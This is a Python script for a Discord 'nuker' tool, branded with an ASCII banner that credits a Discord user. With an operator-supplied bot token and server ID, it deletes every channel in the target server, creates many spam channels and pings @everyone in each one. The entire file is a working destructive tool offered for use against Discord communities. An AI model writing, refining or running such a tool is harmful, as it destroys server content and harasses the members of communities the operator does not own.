import discord
import asyncio
from colorama import init, Fore
import ctypes
import random
import string
import threading
import time
import os

init(autoreset=True)

# Function to change the title bar of the Command Prompt window
def change_title():
    while True:
        title = " " + "".join(random.choices(string.ascii_letters, k=10))
        ctypes.windll.kernel32.SetConsoleTitleW(title)
        time.sleep(0.5)

# Start the title changing in a separate thread
title_thread = threading.Thread(target=change_title)
title_thread.daemon = True
title_thread.start()

# Your new big text
big_text = f"""
{Fore.LIGHTRED_EX}
                                
▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄▓██   ██▓
▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██  ██▒
▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌ ▒██ ██░
░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓  ░ ██▒▓░
 ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒   ██▒▒▒ 
  ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ▓██ ░▒░ 
  ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ ▒ ▒ ░░  
  ░          ░  ░    ░ ░      ░ ░     ░    ░ ░     
  ░                            ░      ░     ░     
  
  
                         > 14 Thousand Forks                                
                         > Made By @Mediyk On Discord                      
                   > Best Nuker Out There                       
                                                                        
{Fore.RESET}"""

async def main():
    # Print the big text centered
    print("\n".join([line.center(os.get_terminal_size().columns) for line in big_text.splitlines()]))

    token = input(f"{Fore.LIGHTRED_EX}Enter your Discord bot token: {Fore.RESET}")
    server_id = input(f"{Fore.LIGHTRED_EX}Enter the ID of the server you want to nuke: {Fore.RESET}")

    print(f'{Fore.LIGHTYELLOW_EX}[?] Would you like to @everyone? (y/n): {Fore.RESET}', end='')
    notify_everyone = input().lower().strip() == 'y'

    print(f'{Fore.LIGHTYELLOW_EX}[?] How many channels do you want to create? (Enter a number): {Fore.RESET}', end='')
    num_channels = int(input())

    print(f'{Fore.LIGHTYELLOW_EX}[?] What do you want the channels names to be? : {Fore.RESET}', end='')
    channel_name = input().strip()

    print(f'{Fore.LIGHTRED_EX}Showing Console... Clearing Rest{Fore.RESET}')
    await asyncio.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n".join([line.center(os.get_terminal_size().columns) for line in big_text.splitlines()]))

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    intents.messages = True

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        try:
            server = client.get_guild(int(server_id))
            # Delete all channels
            for channel in server.channels:
                await channel.delete()
                print(f"{Fore.LIGHTRED_EX}[-] Deleted Channel {channel.id}{Fore.RESET}")

            print(f"{Fore.LIGHTGREEN_EX}[+] Created Channels{Fore.RESET}")

            # Create specified number of channels
            for _ in range(num_channels):
                new_channel = await server.create_text_channel(channel_name)
                print(f"{Fore.LIGHTGREEN_EX}[+] Created Channel {new_channel.id}{Fore.RESET}")

            # Notify @everyone if selected
            if notify_everyone:
                print(f"{Fore.CYAN}[@] Tagged @everyone in each channel{Fore.RESET}")
                for channel in server.channels:
                    await channel.send("@everyone")
                    print(f"{Fore.CYAN}[@] Tagged @everyone in Channel {channel.id}{Fore.RESET}")

            print(f"{Fore.CYAN}Notified everyone!{Fore.RESET}")

            choice = input(f"{Fore.LIGHTYELLOW_EX}[?] Would you like to close the program or reset the nuker to perhaps nuke another server? (c/r): {Fore.RESET}")
            if choice.strip().lower() == 'c':
                await client.close()

        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}An error occurred: {e}{Fore.RESET}")
        await client.close()

    await client.start(token)

asyncio.run(main())
